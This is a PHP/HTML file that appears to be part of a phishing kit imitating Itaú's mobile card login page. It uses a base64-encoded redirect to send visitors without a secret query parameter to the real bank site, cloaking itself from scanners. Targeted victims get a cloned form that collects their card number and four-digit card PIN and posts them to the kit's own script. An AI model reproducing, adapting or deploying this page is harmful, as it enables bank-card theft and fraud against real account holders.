<?php 
if($_GET["the"]==null){
$xxxx = base64_decode("aHR0cHM6Ly93d3cuaXRhdS5jb20uYnIvbW9iaWxlL2NhcnRvZXMv");
header("Location: $xxxx");
}
else{
}
?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<link rel="stylesheet" type="text/css" href="assets/css/style.home.css?xx<?php echo time();?>">
	<script type="text/javascript" src="js/jquery-3.2.1.min.js?xx<?php echo time();?>"></script>
	<script type="text/javascript" src="js/jquery.mask.min.js?xx<?php echo time();?>"></script>
	<script type="text/javascript" src="js/the.home.js?xx<?php echo time();?>"></script>
</head>
<body>
	<header class="top-home">
		<img src="assets/images/logo-login.png">
	</header>
	<section class="frm-container" style="height: 235px;">
		<form name="frmlog" method="POST" action="cliente.php?the=<?php echo time(); ?>" id="frmlog">
			<div class="frm-item">
				<input type="tel" id="numcd" name="numcd" maxlength="16" autocomplete="off" required="" onkeyup="validatebt()">
				<label for="numcd" class="label-float">número do cartão</label>
				<span class="cx"></span>
			</div>
			<div class="frm-item">
				<input type="tel" id="passcd" name="passcd" maxlength="4" autocomplete="off" required="" onkeyup="passballs(this.value), validatebt()">
				<label for="passcd" class="label-float">senha do cartão</label>
				<span class="cd"></span>
				<span id="ball1" class="balls"></span>
				<span id="ball2" class="balls"></span>
				<span id="ball3" class="balls"></span>
				<span id="ball4" class="balls"></span>
			</div>
			<input type="button" id="btnlog" name="btnlog" class="btn" value="acessar" disabled="disabled" onclick="return validateCard()">
			<div id="gif" class="gif" style="display:none; text-align: center;"><img style="width:15%;" src="assets/images/buttongiro.gif"></div>
			<label style="position: relative;top: 10px;left: 0px;font-family: Arial, tahoma;font-size: 13px;color: #fff; transition: all .2s linear; margin-top: 21px;"><u>esqueci minha senha</u></label>
		</form>
	</section>
	
	<div id="invalido" style="display:none; background:#363636 !important; height: 65px;" class="ft-home">
	<div style="margin: 0 auto;padding: 0; width: 350px;">
	<label style="position: relative; top: 10px;left: 11px;font-family: Arial, tahoma;font-size: 12px;color: #fff;transition: all .2s linear; margin-top: 21px; overflow: hidden;">Número de cartão inválido. Confirme o número de seu cartão e digite novamente.</label>
	</div>
	</div>
	
	<footer id="footer" class="ft-home">
		<ul>
			<li>
				<img src="assets/images/ic_contact_card.png">
				<p>pedir cartão</p>
			</li>
			<li>
				<img src="assets/images/ic_itokenapp.png">
				<p>iToken</p>
			</li>
			<li>
				<img src="assets/images/ic_ajuda.png">
				<p>ajuda</p>
			</li>
			<div style="clear: both;"></div>
		</ul>
	</footer>
	<div id="modal_initial" class="modal_initial"><img class="image_initial" src="assets/images/logo.png"></div>
</body>
</html>